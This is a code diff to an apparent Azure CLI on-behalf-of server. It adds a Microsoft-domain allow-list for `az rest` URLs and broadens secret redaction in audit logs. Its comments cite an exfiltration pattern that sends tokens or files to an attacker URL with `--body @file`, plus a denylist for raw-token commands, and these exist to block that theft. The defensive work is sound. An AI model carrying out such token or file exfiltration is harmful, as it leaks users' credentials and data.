@@ -47,9 +47,25 @@ AUDIENCE = [x for x in (CLIENT, f"api://{CLIENT}", os.environ.get("AZOBO_AUDIENC
 REQUIRED_SCOPE = os.environ.get("AZOBO_REQUIRED_SCOPE", "").strip()
 ALLOWED_CLIENTS = [x.strip() for x in os.environ.get("AZOBO_ALLOWED_CLIENTS", "").split(",") if x.strip()]
 
-# Command denylist (egress/exfil control). e.g. "rest,account get-access-token" to
-# remove the rawest token/SSRF primitives for less-trusted deployments.
+# Command denylist (egress/exfil control). e.g. "account get-access-token" to remove
+# the raw-token-to-stdout primitive. (`rest` is handled by the domain allow-list below,
+# not a blanket deny, so legit raw-Graph/ARM still works.)
 DENY_CMDS = [x.strip() for x in os.environ.get("AZOBO_DENY_COMMANDS", "").split(",") if x.strip()]
+
+# `az rest`/`invoke` URL allow-list. An OBO token is only valid at the Microsoft
+# first-party service it's audienced to — there is NO legitimate reason for `az rest`
+# to target a non-Microsoft host, so anything else is exfiltration. We restrict the
+# --url/--uri host to these domain suffixes; this keeps raw Graph/ARM working while
+# killing `rest --url https://attacker… --body @file` token/file exfil. Empty = no
+# restriction. (Residual: an attacker controlling an Azure resource — e.g. their own
+# *.blob.core.windows.net — is bounded/traceable; use an egress proxy allow-list to
+# close even that.)
+# Commercial Azure/Microsoft only by default. Sovereign-cloud operators (US Gov,
+# China, etc.) add their own suffixes via AZOBO_REST_ALLOWED_DOMAINS.
+_DEFAULT_REST_DOMAINS = ("microsoft.com,microsoftonline.com,windows.net,"
+                         "azure.com,azure.net")
+REST_ALLOWED = [d.strip().lower() for d in
+                os.environ.get("AZOBO_REST_ALLOWED_DOMAINS", _DEFAULT_REST_DOMAINS).split(",") if d.strip()]
 
 # Optional concurrency cap (backstop alongside MemoryMax). 0 = unlimited.
 MAX_CONC = int(os.environ.get("AZOBO_MAX_CONCURRENCY", "0"))
@@ -58,12 +74,36 @@ _sem = threading.Semaphore(MAX_CONC) if MAX_CONC > 0 else None
 def _nullctx():
     return contextlib.nullcontext()
 
-# Audit: redact secret-bearing flag VALUES from the logged command.
+# Audit: redact secret-bearing flag VALUES from the logged command. Matches a
+# quoted (possibly multi-word) value OR a bare token, so `--value "a b"` doesn't
+# leak its tail.
 _SECRET_FLAG = re.compile(
     r'(--(?:password|secret|value|client-secret|certificate-password|body|headers?|'
-    r'token|sas[-_]?token|account-key|connection-string|admin-password)[ =])(\S+)', re.I)
+    r'token|sas[-_]?token|account-key|connection-string|admin-password)[ =])'
+    r'("[^"]*"|\'[^\']*\'|\S+)', re.I)
 def _scrub(cmd):
     return _SECRET_FLAG.sub(lambda m: m.group(1) + "***", cmd or "")[:500]
+
+def _rest_host_ok(argv):
+    """For `rest`/`invoke`: extract the --url/--uri host and check it against the
+    Microsoft/Azure allow-list. Returns (ok, host). No allow-list configured → ok."""
+    if not REST_ALLOWED:
+        return True, ""
+    url = None
+    for i, t in enumerate(argv):
+        if t in ("--url", "--uri", "-u") and i + 1 < len(argv):
+            url = argv[i + 1]
+        elif t.startswith(("--url=", "--uri=")):
+            url = t.split("=", 1)[1]
+    if not url:
+        return False, "(no --url)"
+    try:
+        from urllib.parse import urlparse
+        host = (urlparse(url).hostname or "").lower()
+    except Exception:
+        host = ""
+    ok = bool(host) and any(host == d or host.endswith("." + d) for d in REST_ALLOWED)
+    return ok, host
 
 # Azure CLI verbs that mutate — refused in read-only mode. Best-effort (the CLI
 # has no clean read/write taxonomy); RBAC remains the authoritative boundary.
@@ -291,6 +331,12 @@ def az_run(command: str, ctx: Context) -> str:
     joined = " ".join(argv)
     if any(joined == d or joined.startswith(d + " ") for d in DENY_CMDS):
         return json.dumps({"error": "that command is disabled on this server (AZOBO_DENY_COMMANDS)."})
+    if argv and argv[0] in ("rest", "invoke"):
+        ok, host = _rest_host_ok(argv)
+        if not ok:
+            return json.dumps({"error": f"az rest is restricted to Microsoft/Azure endpoints; host {host!r} "
+                "is not allowed. OBO tokens are only valid at Microsoft first-party services — targeting "
+                "anything else is rejected (AZOBO_REST_ALLOWED_DOMAINS)."})
 
     # Register a short-lived broker session for this user, and hand the subprocess
     # only the opaque session id — NOT the assertion and NOT the cert. The wrapper
